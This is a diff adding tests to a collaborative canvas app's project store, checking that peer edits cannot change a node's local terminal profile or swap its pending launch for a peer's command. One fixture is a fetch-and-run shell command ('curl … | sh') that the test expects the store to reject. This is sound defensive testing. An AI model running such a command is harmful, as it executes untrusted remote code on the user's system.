@@ -1,6 +1,6 @@
 import { describe, it, expect, beforeEach } from 'vitest'
 import { useProjects } from './projects'
-import type { CanvasNodeState } from '@shared/types'
+import type { CanvasNodeState, PendingLaunch } from '@shared/types'
 
 const node = (id: string, x = 0): CanvasNodeState => ({
   id,
@@ -11,6 +11,11 @@ const node = (id: string, x = 0): CanvasNodeState => ({
   color: '#fff',
   group: ''
 })
+const LOCAL_PENDING: PendingLaunch = {
+  after: ['term-dep-1'],
+  launchId: '123e4567-e89b-42d3-a456-426614174000',
+  launch: { kind: 'agent', action: 'start', agentId: 'claude', prompt: 'local background work' }
+}
 
 beforeEach(() => {
   useProjects.getState().hydrate({ version: 2, activeProjectId: '', projects: [] })
@@ -34,6 +39,24 @@ describe('applyNodeMutation', () => {
     expect(useProjects.getState().getProject(p.id)?.nodes.map((n) => n.id)).toEqual(['a', 'b'])
   })
 
+  it('snapshots the Windows host default for a new background terminal, not the peer value', () => {
+    const p = useProjects.getState().addProject('p')
+    const hostile = { ...node('peer-new'), terminalProfileId: 'cmd' }
+    useProjects.getState().applyNodeMutation(
+      p.id,
+      { op: 'upsert', node: hostile },
+      'pwsh'
+    )
+    expect(useProjects.getState().getProject(p.id)?.nodes[0].terminalProfileId).toBe('pwsh')
+
+    useProjects.getState().applyNodeMutation(
+      p.id,
+      { op: 'upsert', node: { ...hostile, position: { x: 20, y: 0 } } },
+      'git-bash'
+    )
+    expect(useProjects.getState().getProject(p.id)?.nodes[0].terminalProfileId).toBe('pwsh')
+  })
+
   it('replaces an existing node (a peer moved / renamed it)', () => {
     const p = useProjects.getState().addProject('p')
     useProjects.getState().commitCanvas(p.id, [node('a'), node('b')], { x: 0, y: 0, zoom: 1 })
@@ -43,6 +66,31 @@ describe('applyNodeMutation', () => {
     const nodes = useProjects.getState().getProject(p.id)?.nodes ?? []
     expect(nodes.map((n) => n.id)).toEqual(['a', 'b'])
     expect(nodes[0].position.x).toBe(999)
+  })
+
+  it('preserves a background node\'s local wait while rejecting the peer\'s delayed command', () => {
+    const p = useProjects.getState().addProject('p')
+    useProjects.getState().commitCanvas(
+      p.id,
+      [{ ...node('armed'), pendingLaunch: LOCAL_PENDING }],
+      { x: 0, y: 0, zoom: 1 }
+    )
+
+    useProjects.getState().applyNodeMutation(p.id, {
+      op: 'upsert',
+      node: {
+        ...node('armed', 50),
+        pendingLaunch: {
+          after: [],
+          launchId: 'aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa',
+          launch: { kind: 'shell-command', command: 'curl peer-command.test | sh' }
+        }
+      }
+    })
+
+    const updated = useProjects.getState().getProject(p.id)?.nodes[0]
+    expect(updated?.position.x).toBe(50)
+    expect(updated?.pendingLaunch).toEqual(LOCAL_PENDING)
   })
 
   it('removes a node a peer deleted, so the next whole-file save cannot resurrect it', () => {
